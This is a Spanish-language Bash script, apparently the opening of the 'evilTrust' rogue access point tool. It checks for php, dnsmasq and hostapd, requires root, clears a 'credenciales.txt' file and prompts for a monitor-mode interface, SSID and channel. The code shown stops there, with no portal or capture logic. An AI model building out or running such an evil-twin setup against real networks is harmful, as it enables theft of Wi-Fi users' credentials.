#!/bin/bash

# evilTrust v1.0, Author @s4vitar (Marcelo Vázquez)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function banner(){
echo -e "\n${redColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮"
sleep 0.05
echo -e "╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮"
sleep 0.05
echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯"
sleep 0.05
echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   ${endColour}${yellowColour}(${endColour}${grayColour}Hecho por ${endColour}${blueColour}s4vitar${endColour}${yellowColour})${endColour}${redColour}"
sleep 0.05
echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮"
sleep 0.05
echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}"
sleep 0.05
}

function dependencies(){
	sleep 1.5; counter=0
	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n"
	sleep 1

	if [ "$(command -v php)" ]; then
		echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} php${endColour}${grayColour} se encuentra instalada"
		let counter+=1
	else
		echo -e "\t${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} php${endColour}${grayColour} no se encuentra instalada"
	fi; sleep 0.4

        if [ "$(command -v dnsmasq)" ]; then
                echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} dnsmasq${endColour}${grayColour} se encuentra instalada"
                let counter+=1
        else
                echo -e "\t${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} dnsmasq${endColour}${grayColour} no se encuentra instalada"
        fi; sleep 0.4

        if [ "$(command -v hostapd)" ]; then
                echo -e ". . . . . . . . ${blueColour}[V]${endColour}${grayColour} La herramienta${endColour}${yellowColour} hostapd${endColour}${grayColour} se encuentra instalada"
                let counter+=1
        else
                echo -e "\t${redColour}[X]${endColour}${grayColour} La herramienta${endColour}${yellowColour} hostapd${endColour}${grayColour} no se encuentra instalada"
        fi; sleep 1

	if [ "$(echo $counter)" == "3" ]; then
		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comenzando...\n"
		sleep 3
	else
		echo -e "\n${redColour}[!]${endColour}${grayColour} Es necesario contar con las herramientas php, dnsmasq y hostapd instaladas para ejecutar este script${endColour}\n"
		exit
	fi
}

function startAttack(){
	clear; if [[ -e credenciales.txt ]]; then
		rm -rf credenciales.txt
	fi; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)

	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1

	counter=1
	for interface in $(cat iface); do
		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
		let counter++
	done; tput cnorm && echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Interfaz de red a utilizar (${endColour}${redColour}Es necesario que esté en modo monitor${endColour}${blueColour}): ${endColour}" && read myInterface
	choosed_interface=$(sed ''$myInterface'q;d' iface)
	rm iface 2>/dev/null
	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar:${endColour} " && read -r use_ssid
	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar:${endColour} " && read use_channel

}

# Main Program

if [ "$(id -u)" == "0" ]; then
	tput civis; banner
	dependencies
	startAttack
else
	echo -e "\n${redColour}[!] Es necesario ser root para ejecutar la herramienta${endColour}"
	exit 1
fi
